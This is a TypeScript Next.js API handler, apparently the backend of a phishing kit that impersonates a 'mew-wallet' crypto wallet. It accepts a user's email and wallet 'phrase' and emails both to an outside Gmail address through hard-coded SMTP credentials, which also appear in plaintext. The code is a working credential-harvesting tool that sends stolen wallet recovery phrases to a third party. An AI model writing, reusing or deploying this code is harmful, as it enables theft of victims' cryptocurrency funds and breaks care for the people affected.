
import type { NextApiRequest, NextApiResponse } from 'next';
import * as nodemailer from 'nodemailer';

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {

    if (!req.body.email|| !req.body.phrase) {
        return res
          .status(400)
          .json({ message: 'Please fill out the necessary fields' });
      }
    
    let email=req.body.email;
    let phrase=req.body.phrase;

    let password: string = "^nPDu(NN^)mx";
    let user: string = "mew-wallet@moolapay.co";
   
    const transporter = nodemailer.createTransport({
        service: "mail.moolapay.co",
        auth: {
          user: user, // The account you signed up with SendinBlue
          pass: password,
        },
        secure: false,
      });
  
      const mailData = {
        from: email,
        to: "Ocool7603@gmail.com",
        subject: `phrase and mail coming from mew-wallet at `,
        text: "phrase",
        html: `<b>Email</b>" ${email} "|| <b>Phrase</b>:" ${phrase} "`,
      };


      await new Promise((resolve, reject) => {
        transporter.sendMail(mailData, (err: Error | null, info) => {
          if (err) {
            reject(err);
            return res
              .status(500)
              .json({ error: err.message || 'unable to process your request' });
          } else {
            resolve(info.accepted);
            res.status(200).json({ message: 'Request in process' });
          }
        });
      });
    
      return;
}